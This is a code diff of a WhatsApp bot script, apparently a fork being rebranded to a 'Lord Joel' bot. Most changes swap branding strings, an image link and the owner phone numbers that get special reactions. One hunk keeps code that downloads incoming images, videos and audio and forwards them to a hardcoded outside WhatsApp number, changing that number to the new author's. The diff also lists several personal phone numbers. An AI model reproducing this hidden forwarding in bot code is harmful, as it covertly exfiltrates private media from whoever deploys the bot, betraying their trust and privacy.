@@ -138,7 +138,7 @@ const {
   console.log('Bot connected to whatsapp ✅')
   
   let up = `bado inareply status ama`;
-  conn.sendMessage(conn.user.id, { image: { url: `` }, caption: up })
+  conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/yvf7h8.png` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)  
@@ -171,14 +171,14 @@ const {
     if (ikratos.message.imageMessage) {
     let cap = ikratos.message.imageMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(ikratos.message.imageMessage);
-    return conn.sendMessage("254740007567@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("255714595078@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
   } if (ikratos.message.videoMessage) {
     let cap = ikratos.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(ikratos.message.videoMessage);
-    return conn.sendMessage("254740007567@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("255714595078@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (ikratos.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(ikratos.message.audioMessage);
-    return conn.sendMessage("254740007567@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("255714595078@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
@@ -195,7 +195,7 @@ const {
   const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
   const senderNumber = sender.split('@')[0]
   const botNumber = conn.user.id.split(':')[0]
-  const pushname = mek.pushName || 'Sin Nombre'
+  const pushname = mek.pushName || 'ʟᴏʀᴅ ᴊᴏᴇʟ'
   const isMe = botNumber.includes(senderNumber)
   const isOwner = ownerNumber.includes(senderNumber) || isMe
   const botNumber2 = await jidNormalizedUser(conn.user.id);
@@ -553,17 +553,17 @@ const {
            
   //================ownerreact==============
   
-  if(senderNumber.includes("254740007567")){
+  if(senderNumber.includes("255714595078")){
   if(isReact) return
   m.react("👑")
   }
   
-  if(senderNumber.includes("254740007567")){
+  if(senderNumber.includes("255781144539")){
   if(isReact) return
   m.react("👑")
   }
   
-  if(senderNumber.includes("254740007567")){
+  if(senderNumber.includes("255767570963")){
   if(isReact) return
   m.react("🦋")
    }
@@ -649,7 +649,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("MERCEDES STARTED ✅");
+  res.send("ᴀᴍ ᴊᴏᴇʟ ᴍᴅ ʙᴏᴛ ᴍᴀᴅᴇ ʙʏ ʟᴏʀᴅ ᴊᴏᴇʟ");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
